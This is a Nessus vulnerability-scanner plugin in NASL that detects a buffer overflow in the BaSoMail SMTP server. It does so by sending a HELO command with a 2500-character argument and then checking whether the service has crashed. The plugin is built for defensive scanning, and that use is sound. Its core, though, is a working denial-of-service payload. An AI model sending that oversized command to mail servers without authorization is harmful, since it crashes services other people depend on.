#
# (C) Tenable Network Security, Inc.
#
# Use imate_overflow.nasl as a template (Covered by csm_helo.nasl too, should merge?)
#


include("compat.inc");


if(description)
{
 script_id(11674);
 script_bugtraq_id(7726);
 script_osvdb_id(50541, 50542, 50543);
 script_version ("$Revision: 1.19 $");
 script_name(english:"BaSoMail SMTP Multiple Command Remote Overflow DoS");
 script_summary(english:"Checks if the remote mail server can be oveflown");
 
 script_set_attribute(
   attribute:"synopsis",
   value:"The remote SMTP server has multiple buffer overflow vulnerabilities."
 );
 script_set_attribute(attribute:"description", value:
"The remote SMTP server crashes when it is issued a HELO, MAIL FROM, or
RCPT TO command with an argument longer than 2100 characters.  A
remote attacker could exploit this by crashing the server, or possibly
executing arbitrary code.

It is likely the remote SMTP server is running BaSoMail, though other
products may be affected as well." );
 script_set_attribute(
   attribute:"see_also", 
   value:"http://securitytracker.com/alerts/2003/May/1006863.html"
 );
 script_set_attribute(attribute:"solution", value:
"If the SMTP server is BaSoMail, consider using a different product, as
it has not been actively maintained for several years.  Otherwise,
upgrade to the latest version of the SMTP server." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2003/06/02");
 script_cvs_date("$Date: 2014/05/21 17:27:24 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_family(english:"SMTP problems");
 
 script_copyright(english:"This script is Copyright (C) 2003-2014 Tenable Network Security, Inc.");
 
 script_dependencie("smtpserver_detect.nasl", "sendmail_expn.nasl");
 script_require_ports("Services/smtp", 25);

 exit(0);
}
#
# The script code starts here
#
include("global_settings.inc");
include("smtp_func.inc");
include("misc_func.inc");

port = get_service(svc:"smtp", default: 25, exit_on_fail:1);
if (get_kb_item('SMTP/'+port+'/broken'))
 exit(1, "The MTA on port "+port+" is broken.");

soc = open_sock_tcp(port);
if (! soc) exit(1, "Cannot connect to TCP port "+port+".");

s = smtp_recv_banner(socket:soc);
if (!s)
{
 close(soc);
 exit(1, "No SMTP banner on port "+port+".");
}

 if(!egrep(pattern:"^220 .*", string:s))
 {
   close(soc);
   exit(0);
 }
 
crp = 'HELO ' + crap(2500) +'\r\n';
 send(socket:soc, data:crp);
 data = recv_line(socket:soc, length:4);
 close(soc);
 
if (service_is_dead(port: port, exit: 1) > 0)
  security_hole(port);
